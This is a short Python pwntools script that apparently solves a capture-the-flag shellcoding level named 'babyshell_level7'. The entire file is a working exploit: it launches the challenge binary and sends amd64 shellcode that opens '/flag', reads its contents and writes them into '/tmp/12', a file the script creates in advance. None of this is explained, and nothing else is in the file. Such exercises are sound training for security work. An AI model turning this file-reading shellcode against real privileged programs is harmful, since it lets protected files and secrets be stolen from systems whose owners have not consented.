from pwn import *
import os
r = process('/challenge/babyshell_level7')
os.system('touch /tmp/12')
context.arch='amd64'
payload = asm(
    '''


    mov DWORD ptr [rbp], 0x616c662f
    mov WORD ptr [rbp+4], 0x67

    mov rcx, 0x0032312f706d742f
    push rcx

    mov rax, 2
    mov rdi, rbp
    mov rsi, 0
    mov rdx, 0
    syscall


    mov rdi, rax
    mov rsi, rbp
    mov rdx, 100
    mov rax, 0
    syscall


    mov rax, 2
    mov rdi, rsp
    mov rsi, 1
    mov rdx, 0
    syscall

    mov rsi, rbp
    mov rdi, rax
    mov rdx, 100
    mov rax, 1 
    syscall




    '''
)





r.send(payload)
r.interactive()